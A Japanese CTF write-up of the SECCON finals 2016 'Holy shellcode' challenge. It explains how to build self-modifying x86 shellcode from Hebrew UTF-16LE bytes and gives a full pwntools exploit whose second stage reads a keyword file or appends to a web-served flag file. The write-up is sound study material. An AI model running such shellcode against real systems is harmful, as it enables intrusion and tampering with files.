---
layout: post
redirect_from:
  - /blog/2017/01/30/seccon-finals-2016-holy-shellcode/
date: "2017-01-30T03:52:06+09:00"
tags: [ "ctf", "writeup", "seccon", "pwn", "shellcode" ]
---

# SECCON finals 2016: 伍(5)

## problem

>   Holy shellcode using Hebrew characters in UTF-16LE

UTF-16LEでヘブライ語として解釈されるようなbyte列でx86 shellcodeを書く問題。

参考として以下のような表が与えられる。
表で青色で示されているのは修飾文字なのであまり自由には使えない。赤色もだいたい同様。

![](/blog/2017/01/30/seccon-finals-2016-holy-shellcode/table.png)

shellcodeを実行するためのバイナリも与えられている。

## solution

使える命令が不足しているので、動的に命令を生成する必要がある。
書き込み可能な命令は`stos BYTE PTR es:[edi], al`のみなのでこれを用いて命令を書き込む。
`call eax`で移ってくる都合上`eax`にはbufferのアドレス$0x804a2a0$が入っている。
`xchg edi, eax`があるのでこれで移せばよい。

書き込み先は`eip`の進む先にしたい。
操作できるのは`eax`のみなので、`xchg edi, eax`の前にアドレスに加算しておく。
これには`sub al, 0xfb`や`xor al, 0xfb`を使う。

しかし`al`の操作では下位$1$byteしか増減させられずかつ`eax`の初期値が$0x804a2a0$なので、後のことを考えると空間が足りない。
$0x97$ (`xchg edi, eax`)は後ろに$0x05$ (`add eax, 0x????????`)を伴うので一度退避させたbufferのアドレスを戻してくることはできないのが問題であるが、この$0x05$を上書きして潰してやることでアドレスの`eax`への復帰が可能である。
`eax`の下位byteを$0xff$にして`edi`へ移し、($0x05$を潰すと同時に)`stos`によるincrementで桁上げされた後の`edi`を`eax`へ復帰させ、再度`al`を操作し`edi`の再設定をすれば、`eip`から`eax`までの余裕を$250$byteほど作ることができる。
これで空間の問題は解決する。

次に`fgets`のpltを`call`する命令を書き込む。
書き込みと同時に発生する`add eax, 0x????????`と`sub al, 0xfb`を使って最下位byteを調整しながら、$1$byteずつ書き込めばよい。

後は単に無制約の機械語を流し込んでいい感じにする。

## implementation

### payload (UTF-8へ変換済み)

```
שּׁשּׁשּׁשּׁשּׁשּׁשּׁשּׁשּׁשּׁשּׁשּׁשּׁשּׁשּׁשּׁשּׁשּׁשּׁ֗נּלּלּ֪הּהּלּלּלּלּלּלּלּלּלּלּלּלּלּלּלּלּלּלּלּלּלּ֗הּשּׁ֗לּלּ֪ױלּ֪נּלּשּׁשּׁשּׁשּׁשּׁשּׁשּׁ֪לּלּשּׁשּׁשּׁשּׁשּׁהּ֪ךּלּשּׁשּׁשּׁשּׁשּׁשּׁשּׁשּׁ֪װלּשּׁשּׁשּׁשּׁ֪יּלּשּׁשּׁשּׁ֪װלּשּׁשּׁשּׁשּׁשּׁשּׁשּׁשּׁ֪נלּ֪נלּ֪טלּ֪ױלּשּׁשּׁשּׁ֪מּלּשּׁשּׁשּׁשּׁשּׁ֪טלּהּשּׁשּׁשּׁשּׁ֪ױלּשּׁשּׁשּׁ֪תלּשּׁשּׁשּׁ֪ױלּשּׁשּׁשּׁשּׁשּׁשּׁשּׁשּׁשּׁ֪ױלּשּׁשּׁשּׁ֪װלּלּלּלּלּלּלּלּלּלּלּלּלּלּלּלּלּלּלּלּלּ
```

### payload (disasm)

``` asm
804a2a0:       2c fb                   sub    al,0xfb
804a2a2:       2c fb                   sub    al,0xfb
804a2a4:       2c fb                   sub    al,0xfb
804a2a6:       2c fb                   sub    al,0xfb
804a2a8:       2c fb                   sub    al,0xfb
804a2aa:       2c fb                   sub    al,0xfb
804a2ac:       2c fb                   sub    al,0xfb
804a2ae:       2c fb                   sub    al,0xfb
804a2b0:       2c fb                   sub    al,0xfb
804a2b2:       2c fb                   sub    al,0xfb
804a2b4:       2c fb                   sub    al,0xfb
804a2b6:       2c fb                   sub    al,0xfb
804a2b8:       2c fb                   sub    al,0xfb
804a2ba:       2c fb                   sub    al,0xfb
804a2bc:       2c fb                   sub    al,0xfb
804a2be:       2c fb                   sub    al,0xfb
804a2c0:       2c fb                   sub    al,0xfb
804a2c2:       2c fb                   sub    al,0xfb
804a2c4:       2c fb                   sub    al,0xfb
804a2c6:       97                      xchg   edi,eax
804a2c7:       05 40 fb 3c fb          add    eax,0xfb3cfb40
804a2cc:       3c fb                   cmp    al,0xfb
804a2ce:       aa                      stos   BYTE PTR es:[edi],al
804a2cf:       05 34 fb 34 fb          add    eax,0xfb34fb34
804a2d4:       3c fb                   cmp    al,0xfb
804a2d6:       3c fb                   cmp    al,0xfb
804a2d8:       3c fb                   cmp    al,0xfb
804a2da:       3c fb                   cmp    al,0xfb
804a2dc:       3c fb                   cmp    al,0xfb
804a2de:       3c fb                   cmp    al,0xfb
804a2e0:       3c fb                   cmp    al,0xfb
804a2e2:       3c fb                   cmp    al,0xfb
804a2e4:       3c fb                   cmp    al,0xfb
804a2e6:       3c fb                   cmp    al,0xfb
804a2e8:       3c fb                   cmp    al,0xfb
804a2ea:       3c fb                   cmp    al,0xfb
804a2ec:       3c fb                   cmp    al,0xfb
804a2ee:       3c fb                   cmp    al,0xfb
804a2f0:       3c fb                   cmp    al,0xfb
804a2f2:       3c fb                   cmp    al,0xfb
804a2f4:       3c fb                   cmp    al,0xfb
804a2f6:       3c fb                   cmp    al,0xfb
804a2f8:       3c fb                   cmp    al,0xfb
804a2fa:       3c fb                   cmp    al,0xfb
804a2fc:       3c fb                   cmp    al,0xfb
804a2fe:       97                      xchg   edi,eax
804a2ff:       05 34 fb 2c fb          add    eax,0xfb2cfb34
804a304:       97                      xchg   edi,eax
804a305:       05 3c fb 3c fb          add    eax,0xfb3cfb3c
804a30a:       aa                      stos   BYTE PTR es:[edi],al
804a30b:       05 f1 05 3c fb          add    eax,0xfb3c05f1
804a310:       aa                      stos   BYTE PTR es:[edi],al
804a311:       05 40 fb 3c fb          add    eax,0xfb3cfb40
804a316:       2c fb                   sub    al,0xfb
804a318:       2c fb                   sub    al,0xfb
804a31a:       2c fb                   sub    al,0xfb
804a31c:       2c fb                   sub    al,0xfb
804a31e:       2c fb                   sub    al,0xfb
804a320:       2c fb                   sub    al,0xfb
804a322:       2c fb                   sub    al,0xfb
804a324:       aa                      stos   BYTE PTR es:[edi],al
804a325:       05 3c fb 3c fb          add    eax,0xfb3cfb3c
804a32a:       2c fb                   sub    al,0xfb
804a32c:       2c fb                   sub    al,0xfb
804a32e:       2c fb                   sub    al,0xfb
804a330:       2c fb                   sub    al,0xfb
804a332:       2c fb                   sub    al,0xfb
804a334:       34 fb                   xor    al,0xfb
804a336:       aa                      stos   BYTE PTR es:[edi],al
804a337:       05 3a fb 3c fb          add    eax,0xfb3cfb3a
804a33c:       2c fb                   sub    al,0xfb
804a33e:       2c fb                   sub    al,0xfb
804a340:       2c fb                   sub    al,0xfb
804a342:       2c fb                   sub    al,0xfb
804a344:       2c fb                   sub    al,0xfb
804a346:       2c fb                   sub    al,0xfb
804a348:       2c fb                   sub    al,0xfb
804a34a:       2c fb                   sub    al,0xfb
804a34c:       aa                      stos   BYTE PTR es:[edi],al
804a34d:       05 f0 05 3c fb          add    eax,0xfb3c05f0
804a352:       2c fb                   sub    al,0xfb
804a354:       2c fb                   sub    al,0xfb
804a356:       2c fb                   sub    al,0xfb
804a358:       2c fb                   sub    al,0xfb
804a35a:       aa                      stos   BYTE PTR es:[edi],al
804a35b:       05 39 fb 3c fb          add    eax,0xfb3cfb39
804a360:       2c fb                   sub    al,0xfb
804a362:       2c fb                   sub    al,0xfb
804a364:       2c fb                   sub    al,0xfb
804a366:       aa                      stos   BYTE PTR es:[edi],al
804a367:       05 f0 05 3c fb          add    eax,0xfb3c05f0
804a36c:       2c fb                   sub    al,0xfb
804a36e:       2c fb                   sub    al,0xfb
804a370:       2c fb                   sub    al,0xfb
804a372:       2c fb                   sub    al,0xfb
804a374:       2c fb                   sub    al,0xfb
804a376:       2c fb                   sub    al,0xfb
804a378:       2c fb                   sub    al,0xfb
804a37a:       2c fb                   sub    al,0xfb
804a37c:       aa                      stos   BYTE PTR es:[edi],al
804a37d:       05 e0 05 3c fb          add    eax,0xfb3c05e0
804a382:       aa                      stos   BYTE PTR es:[edi],al
804a383:       05 e0 05 3c fb          add    eax,0xfb3c05e0
804a388:       aa                      stos   BYTE PTR es:[edi],al
804a389:       05 d8 05 3c fb          add    eax,0xfb3c05d8
804a38e:       aa                      stos   BYTE PTR es:[edi],al
804a38f:       05 f1 05 3c fb          add    eax,0xfb3c05f1
804a394:       2c fb                   sub    al,0xfb
804a396:       2c fb                   sub    al,0xfb
804a398:       2c fb                   sub    al,0xfb
804a39a:       aa                      stos   BYTE PTR es:[edi],al
804a39b:       05 3e fb 3c fb          add    eax,0xfb3cfb3e
804a3a0:       2c fb                   sub    al,0xfb
804a3a2:       2c fb                   sub    al,0xfb
804a3a4:       2c fb                   sub    al,0xfb
804a3a6:       2c fb                   sub    al,0xfb
804a3a8:       2c fb                   sub    al,0xfb
804a3aa:       aa                      stos   BYTE PTR es:[edi],al
804a3ab:       05 d8 05 3c fb          add    eax,0xfb3c05d8
804a3b0:       34 fb                   xor    al,0xfb
804a3b2:       2c fb                   sub    al,0xfb
804a3b4:       2c fb                   sub    al,0xfb
804a3b6:       2c fb                   sub    al,0xfb
804a3b8:       2c fb                   sub    al,0xfb
804a3ba:       aa                      stos   BYTE PTR es:[edi],al
804a3bb:       05 f1 05 3c fb          add    eax,0xfb3c05f1
804a3c0:       2c fb                   sub    al,0xfb
804a3c2:       2c fb                   sub    al,0xfb
804a3c4:       2c fb                   sub    al,0xfb
804a3c6:       aa                      stos   BYTE PTR es:[edi],al
804a3c7:       05 ea 05 3c fb          add    eax,0xfb3c05ea
804a3cc:       2c fb                   sub    al,0xfb
804a3ce:       2c fb                   sub    al,0xfb
804a3d0:       2c fb                   sub    al,0xfb
804a3d2:       aa                      stos   BYTE PTR es:[edi],al
804a3d3:       05 f1 05 3c fb          add    eax,0xfb3c05f1
804a3d8:       2c fb                   sub    al,0xfb
804a3da:       2c fb                   sub    al,0xfb
804a3dc:       2c fb                   sub    al,0xfb
804a3de:       2c fb                   sub    al,0xfb
804a3e0:       2c fb                   sub    al,0xfb
804a3e2:       2c fb                   sub    al,0xfb
804a3e4:       2c fb                   sub    al,0xfb
804a3e6:       2c fb                   sub    al,0xfb
804a3e8:       2c fb                   sub    al,0xfb
804a3ea:       aa                      stos   BYTE PTR es:[edi],al
804a3eb:       05 f1 05 3c fb          add    eax,0xfb3c05f1
804a3f0:       2c fb                   sub    al,0xfb
804a3f2:       2c fb                   sub    al,0xfb
804a3f4:       2c fb                   sub    al,0xfb
804a3f6:       aa                      stos   BYTE PTR es:[edi],al
804a3f7:       05 f0 05 3c fb          add    eax,0xfb3c05f0
804a3fc:       3c fb                   cmp    al,0xfb
804a3fe:       3c fb                   cmp    al,0xfb
804a400:       3c fb                   cmp    al,0xfb
804a402:       3c fb                   cmp    al,0xfb
804a404:       3c fb                   cmp    al,0xfb
804a406:       3c fb                   cmp    al,0xfb
804a408:       3c fb                   cmp    al,0xfb
804a40a:       3c fb                   cmp    al,0xfb
804a40c:       3c fb                   cmp    al,0xfb
804a40e:       3c fb                   cmp    al,0xfb
804a410:       3c fb                   cmp    al,0xfb
804a412:       3c fb                   cmp    al,0xfb
804a414:       3c fb                   cmp    al,0xfb
804a416:       3c fb                   cmp    al,0xfb
804a418:       3c fb                   cmp    al,0xfb
804a41a:       3c fb                   cmp    al,0xfb
804a41c:       3c fb                   cmp    al,0xfb
804a41e:       3c fb                   cmp    al,0xfb
804a420:       3c fb                   cmp    al,0xfb
804a422:       3c fb                   cmp    al,0xfb
```

### python

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='5.finals.seccon.jp')
parser.add_argument('port', nargs='?', default=12345, type=int)
parser.add_argument('--log-level', default='debug')
parser.add_argument('--binary', default='./musl')
parser.add_argument('--keyword')
args = parser.parse_args()
context.log_level = args.log_level
context.arch = 'i386'
context.bits = 32
elf = ELF(args.binary)
str_s = 0x8048fda # "%s(%d)\n"
str_d = 0x8048fdc # "(%d)\n"
log.info('system.plt: %#x', elf.plt['system'])
log.info('shellcode: %#x', elf.symbols['shellcode'])

gadgets = []
for c in list(range(0x1d, 0x36+1)) + list(range(0x38, 0x3c+1)) + [ 0x3e, 0x40 ]:
    gadgets += [ chr(c) + '\xfb' ]
for c in list(range(0x91, 0xc0+1)) + list(range(0xd0, 0xea+1)) + list(range(0xf0, 0xf4+1)):
    gadgets += [ chr(c) + '\x05' ]
for it in gadgets:
    log.info('%s:\n%s', repr(it), disasm(it + '\x90' * 4))

cmp_al_fb = '<\xfb' # black
nop = cmp_al_fb
xchg_edi_eax = '\x97\x05' # blue, del eax
stos_at_edi_al = '\xaa\x05' # del eax
sub_al_fb = ',\xfb' # or add 5
xor_al_fb = '4\xfb'

hebrew = ''
# move eax to the future
hebrew += sub_al_fb * 19
# move shellcode ptr to edi  (eax is 0xYYYYYY00 after here)
hebrew += xchg_edi_eax + '\x40\xfb' + '\x3c\xfb'
hebrew += nop
# make inc eax
hebrew += stos_at_edi_al + '4\xfb' + '4\xfb'  # write 0x40 : inc eax
hebrew += nop * 21
hebrew += xchg_edi_eax  # 0x05 is overwritten
assert elf.symbols['shellcode'] + len(hebrew) == 0x804a300
# here, eax is 0x01
hebrew += xor_al_fb
hebrew += sub_al_fb
# eax is 0xff
# re-set edi  (edi becomes 0x804a3fa after xchg, eax does 0xYYYYYY74)
hebrew += xchg_edi_eax + '\x3c\xfb' + '\x3c\xfb'
# 0:   a1 04 a2 04 08          mov eax, [obj.stdin__GLIBC_2.0]
# 1:   50
# 6:   68 48 28 00 00          push   0x2848
# 7:   57                      push   edi
# c:   e8 ?? ?? ?? ??          call   fgets  (0x80485f8 - (c+5))
#         e8 e1 ff ff                         0x80485f8 - (0x804a40b+5)
hebrew += stos_at_edi_al + '\xf1\x05' + '\x3c\xfb'  # write 0xb0 for nop
hebrew += stos_at_edi_al + '\x40\xfb' + '\x3c\xfb'  # write 0xa1
hebrew += sub_al_fb * 7
hebrew += stos_at_edi_al + '\x3c\xfb' + '\x3c\xfb'  # write 0x04
hebrew += sub_al_fb * 5
hebrew += xor_al_fb
hebrew += stos_at_edi_al + '\x3a\xfb' + '\x3c\xfb'  # write 0xa2
hebrew += sub_al_fb * 8
hebrew += stos_at_edi_al + '\xf0\x05' + '\x3c\xfb'  # write 0x04
hebrew += sub_al_fb * 4
hebrew += stos_at_edi_al + '\x39\xfb' + '\x3c\xfb'  # write 0x08
hebrew += sub_al_fb * 3
hebrew += stos_at_edi_al + '\xf0\x05' + '\x3c\xfb'  # write 0x50
hebrew += sub_al_fb * 8
hebrew += stos_at_edi_al + '\xe0\x05' + '\x3c\xfb'  # write 0x68
hebrew += stos_at_edi_al + '\xe0\x05' + '\x3c\xfb'  # write 0x48
hebrew += stos_at_edi_al + '\xd8\x05' + '\x3c\xfb'  # write 0x28
hebrew += stos_at_edi_al + '\xf1\x05' + '\x3c\xfb'  # write 0x00
hebrew += sub_al_fb * 3
hebrew += stos_at_edi_al + '\x3e\xfb' + '\x3c\xfb'  # write 0x00
hebrew += sub_al_fb * 5
hebrew += stos_at_edi_al + '\xd8\x05' + '\x3c\xfb'  # write 0x57
hebrew += xor_al_fb
hebrew += sub_al_fb * 4
hebrew += stos_at_edi_al + '\xf1\x05' + '\x3c\xfb'  # write 0xe8
hebrew += sub_al_fb * 3
hebrew += stos_at_edi_al + '\xea\x05' + '\x3c\xfb'  # write 0xe8
hebrew += sub_al_fb * 3
hebrew += stos_at_edi_al + '\xf1\x05' + '\x3c\xfb'  # write 0xe1
hebrew += sub_al_fb * 9
hebrew += stos_at_edi_al + '\xf1\x05' + '\x3c\xfb'  # write 0xff
hebrew += sub_al_fb * 3
hebrew += stos_at_edi_al + '\xf0\x05' + '\x3c\xfb'  # write 0xff
hebrew += nop * 20

if args.keyword:
    shellcode = []
    shellcode += [ # open
        'push %d' % u32('xt\0\0'),
        'push %d' % u32('ag.t'),
        'push %d' % u32('e/fl'),
        'push %d' % u32('fens'),
        'push %d' % u32('l/de'),
        'push %d' % u32('/htm'),
        'push %d' % u32('ginx'),
        'push %d' % u32('re/n'),
        'push %d' % u32('/sha'),
        'push %d' % u32('/usr'),
        'mov eax, esp',
        'mov ebx, eax',
        'mov ecx, 0x401', # O_WRONLY | O_APPEND
        'mov edx, 0', # mode ?
        'mov eax, 5', # sys_open
        'int 0x80',
        'mov esi, eax',
    ]
    keyword = args.keyword
    shellcode += [ # write
        'mov ebx, 0x30020202',
        'mov eax, 0x00080808',
        'xor ebx, eax',
        'push ebx', # "\n\n\n\n"
        'push %d' % u32(keyword[0x1c :][: 0x4]),
        'push %d' % u32(keyword[0x18 :][: 0x4]),
        'push %d' % u32(keyword[0x14 :][: 0x4]),
        'push %d' % u32(keyword[0x10 :][: 0x4]),
        'push %d' % u32(keyword[0x0c :][: 0x4]),
        'push %d' % u32(keyword[0x08 :][: 0x4]),
        'push %d' % u32(keyword[0x04 :][: 0x4]),
        'push %d' % u32(keyword[0x00 :][: 0x4]),
        'mov ebx, 0x02020230',
        'mov eax, 0x08080800',
        'xor ebx, eax',
        'push ebx', # "\n\n\n\n"
        'mov eax, esp',
        'mov edx, %d' % (len(keyword) + 8), # count
        'mov ecx, eax', # buf
        'mov ebx, esi', # fd
        'mov eax, 4', # sys_write
        'int 0x80',
    ]
    shellcode = asm('\n'.join(shellcode))
else:
    shellcode = asm('\n'.join([
        # open
        'push %d' % u32('txt\0'),
        'push %d' % u32('ord.'),
        'push %d' % u32('keyw'),
        'mov eax, esp',
        'mov ebx, eax',
        'mov ecx, 0', # O_RDONLY
        'mov edx, 0', # mode ?
        'mov eax, 5', # sys_open
        'int 0x80',
        'mov esi, eax',
        # read
        'mov edx, 400', # count
        'mov ecx, %d' % elf.symbols['shellcode'], # buf
        'mov ebx, esi', # fd
        'mov eax, 3', # sys_read
        'int 0x80',
        # send
        'push %d' % elf.symbols['shellcode'],
        'mov eax, %d' % elf.plt['printf'],
        'call eax',
    ]))
    # => SECCON{John_the_8_7}

log.info('%s', fiddling.hexdump(hebrew))
log.info(disasm(hebrew, vma=elf.symbols['shellcode']))
log.info('length: %d', len(hebrew))

p = remote(args.host, args.port)
p.send(hebrew + '\n' + shellcode + '\n')
log.info(p.recvall())
```
